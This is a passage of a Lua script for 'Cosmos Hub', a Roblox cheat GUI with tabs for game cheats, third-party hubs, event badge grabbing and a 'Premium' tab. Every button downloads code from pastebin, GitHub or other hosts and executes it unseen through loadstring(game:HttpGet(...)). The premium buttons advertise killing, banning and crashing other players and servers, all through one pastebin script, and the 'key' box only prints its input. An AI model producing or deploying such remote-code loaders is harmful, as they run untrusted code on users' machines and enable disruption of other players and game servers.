    loadstring(game:HttpGet("https://pastebin.com/raw/bKu2GuzN", true))()
end)
ss:Button("Beerus Form",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/c1TGDAKC", true))()
end)
ss:Button("Omega Form",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/VSerZV3e", true))()
end)
ss:Button("Galaxy Slasher",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Toasty8i/slasher/main/slasher.lua'),true))()
end)
local ss = s:Tab("Games")
ss:Label("- -Join the game you want & Click the buttons below- -")
ss:Button("Prison Life",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/wMagw9Cn", true))()
end)
ss:Button("Gun Simulator",function()
    loadstring(game:HttpGet("https://paste.ee/r/KOoZW", true))()
end)
ss:Button("Tower Of Hell",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/iiProductionz/Floater-Scripts/main/WaifuEdition/Tower%20Of%20Hell"))()
end)
ss:Button("Lefends Of Speed",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
end)
ss:Button("Ninja Legends",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
end)
ss:Button("Saber Simulator",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
end)
ss:Button("BIG Paintball",function()
    pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/paintball.lua")))
loadstring(game:HttpGet('https://pastebin.com/raw/GVvyGhpx'))()
end)
ss:Button("Adopt Me",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))()
end)
ss:Button("Roblox Talent Show",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/liloskiller/Scripts/main/TalentShowObbyAutoFarm", true))()
end)
ss:Button("Da Hood",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
end)
ss:Button("Aimblox",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Straden/Scripts/main/stronccMain.lua'),true))()
end)
ss:Button("Assasins",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))()
end)
ss:Button("Bloxburg",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/Wcd0ajFS")))
end)
ss:Button("Bubble Gum",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/BubbleGumQoucxHub.lua"))()
end)
ss:Button("Bed Wars",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)
ss:Button("Doomspire",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/garfield%20hub", true))()
end)
ss:Button("Islands",function()
    loadstring(game:HttpGet("http://void-scripts.com/Scripts/islands_new.lua"))()
end)
ss:Button("KAT",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/78kG7trR", true))()
end)
ss:Button("Murder Mystery 2",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/34KnyYvi", true))()
end)
ss:Button("Mad City",function()
    pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/mad.lua")))
end)
ss:Button("Pet Sim X",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/BdvUGb2q"))()
end)
ss:Button("Work At A Pizza Place",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/work-a-pizza-place.lua",true))()
end)
ss:Button("Ragdoll Engine",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Scripts/master/Vynixius%20Ragdoll%20Engine"))()
end)
ss:Button("SCP 3008",function()
    loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/scripts/main/3008.lua')()
end)
ss:Button("Mega Easy Obby",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/X361rzKq"))()
end)
ss:Button("Blox Fruits",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Cve-Hub/LnHub/main/README.md'))()
end)
ss:Button("Funky Friday",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoinkyPoinkie/FunkyFridayDevTools/main/Un-Obfuscated",true))()
end)
ss:Button("Custom PC",function()
    loadstring(game:HttpGetAsync("https://projectevo.xyz/v3/releases/custompctycoon.lua", true))()
end)
ss:Button("Bid Battles",function()
    loadstring(game:HttpGet("https://soggyhubv2.vercel.app"))()
end)
ss:Button("Natural Disasters",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/9NLK7/93qjoadnlaknwldk/main/main'))()
end)
ss:Button("Bed Wars",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/joeengo/Future/main/loadstring.lua', true))()
end)
ss:Button("Combat Warriors",function()
    loadstring(game:HttpGet("https://projecthook.xyz/scripts/free.lua"))()
end)
ss:Label("- -None of the scripts above are mine- -")
local ss = s:Tab("Hubs")
ss:Label("- -These Are Hubs From Other People- -")
ss:Button("OG Cosmos Hub",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/OG-Pylwt/main/README.md", true))()
end)
ss:Button("Top3k Hub",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/Top3k/main/hub", true))()
end)
ss:Button("Alpha X Hub",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bUmX44UN", true))()
end)
ss:Button("Bolts Hub",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/fusiongreg/BoltsHubV5/main/BoltsHubV5'), true))()
end)
ss:Button("Bruh Hub",function()
    loadstring(game:HttpGet("https://bruh.keshsenpai.com/.lua"))()
end)
ss:Button("Dark Hub",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
end)
ss:Button("Eclipse Hub",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/34KnyYvi", true))()
end)
ss:Button("Extreme Hub",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ExtremeAntonis/KeySystemUI/main/KeySystemUI-Obfuscated.lua"))()
end)
ss:Button("EZ Hub",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
end)
ss:Button("Sorky Hub",function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/MHx8q6xP'),true))()
end)
ss:Button("Owl Hub",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end)
ss:Button("VG Hub",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))()
end)
local ss = s:Tab("Events")
ss:Label("- -These Are Scripts For Roblox Events- -")
ss:Label("- -They can get you Badges and Avatar Items- -")
ss:Button("Island of Move",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Roblox Community Space",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Bump World: Free Jungle",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Mansion of Wonder",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Roblox Creator Challenge",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Roblox Creator Challenge Space",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Roblox Creator Challenge Library",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Roblox Creator Quiz",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Luobu Mystery Box Hunt",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Bakugan Launch Party",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Beat the Scammers",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
ss:Button("Seventh Uncle, Ye Zehao Launch Party",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
local ss = s:Tab("Premium")
ss:Label("Buy Cosmos Premium In Our Discord Server")
ss:Textbox("Enter Premium Key", true,function(t)
    print(t)
    end)
    ss:Label("The Buttons Will Only Work When You Enter A Key")
ss:Button("Mute Player",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Fling Player",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Loop Fling Player",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Freeze Player",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Explode Player",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Kill Player",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Kill Aura",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Kick Player",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Ban Player",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Mute All",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Freeze All",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Explode All",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Kill All",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Kick All (Laggy)",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Ban All (Laggy)",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Lag Server",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Freeze Server",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Close Server",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Crash Server",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Flip Map",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Destroy Map (Laggy)",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Delete Map",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Cosmos Admin Commands",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
local ss = s:Tab("Credits")
ss:Label("Made By Tim")
ss:Label("Discord ID: 816559979959156766")
ss:Label("Server: Discord.gg/QnbxmxMrJG")
ss:Label("Thank you for choosing Cosmos Hub!")
ss:Label("- - - - - - - - - - - - - - - - - - - - - - -")
ss:Label("Theme: RGB Rainbow")
ss:Label("Last Update: 30th Of July 2022")
ss:Label("Version: 3.3b")
